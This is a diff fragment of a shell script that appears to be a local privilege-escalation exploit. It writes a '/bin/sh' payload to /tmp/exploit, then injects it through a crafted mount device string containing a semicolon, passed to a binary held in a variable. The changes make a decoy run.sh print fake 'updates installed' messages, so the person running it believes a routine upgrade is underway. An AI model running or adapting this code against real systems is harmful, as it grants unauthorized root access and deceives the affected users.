@@ -50,11 +50,19 @@ then
 
     echo "/bin/sh" > /tmp/exploit
     chmod a+x /tmp/exploit
-    touch run.sh
+    touch run.sh 
     chmod +x run.sh
-    echo "apt update ; apt upgrade > /tmp/fish.txt ; sleep 3 ; rm /tmp/fish.txt " >> run.sh
-    echo "[+] Enter the command './run.sh' : "
-    ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+    echo "#!/bin/bash
+        apt update > /dev/null
+        clear
+        echo '[!] Updates installed .'
+        sleep 3
+        apt upgrade > /dev/null 
+        clear
+        echo '[!] Upgrades installed. '
+        sleep 3 " > run.sh
+    echo "[!] Now Installing Updates.. "
+    echo "./run.sh " | ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
     )
 else
     echo "[~] Proceeding to Alarm.sh.."
